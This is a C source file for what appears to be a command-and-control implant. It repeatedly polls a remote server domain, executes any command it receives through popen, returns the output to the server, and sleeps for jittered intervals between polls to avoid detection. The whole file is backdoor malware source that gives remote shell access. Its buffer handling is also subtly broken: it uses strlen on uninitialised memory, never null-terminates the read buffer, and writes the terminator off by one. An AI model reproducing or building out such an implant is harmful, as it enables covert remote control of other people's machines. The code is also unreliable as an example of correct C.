#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

#include "lib/options.h"
#include "lib/client.h"
#include "lib/utils.h"

#include "lib/debug.h"

int main()
{
    srand(time(NULL));

    struct Client *client = init_client();
    Dprintf("[d] booting agent for %s\n", client->domain);

    while (1)
    {
        poll(client);

        switch (client->status)
        {
        case Idle:
            break;

        case Command:
            Dprintf("[d] we have the '%s' command to execute!\n", client->command);
            FILE *cmd = popen(client->command, "r");
            if (cmd == NULL)
            {
                Dprintf("[d] error: failed to execute command %s\n", client->command);
            }

            static char buff[1024];
            char *res = malloc(1 * sizeof(char));
            u_int res_size = 0;
            size_t n;

            while ((n = fread(buff, 1, sizeof(buff), cmd)) > 0)
            {
                char *t_res = realloc(res, strlen(res) + strlen(buff) + 1);
                if (t_res == NULL)
                {
                    Dprintf("[d] reallocation for more cmd output failed\n");

                    client->status = Idle;
                    break;
                }

                res = t_res;
                strcat(res, buff);

                res_size += n;
            }

            res[res_size+1] = '\0';
            pclose(cmd);

            Dprintf("[d] command output:\n\n%s\n", res);
            respond_cmd(client, res);

            free(res);

            client->status = Idle;
            break;

        case Error:
            Dprintf("[e] the server indicated an error occured, resetting");
            client->status = Idle;
            break;

        default:
            Dprintf("[e] something is wrong, client reached an unknown status");
            break;
        }

        Dprintf("[d] client status is: %d\n", client->status);
        jittered_sleep();
    }

    return 0;
}
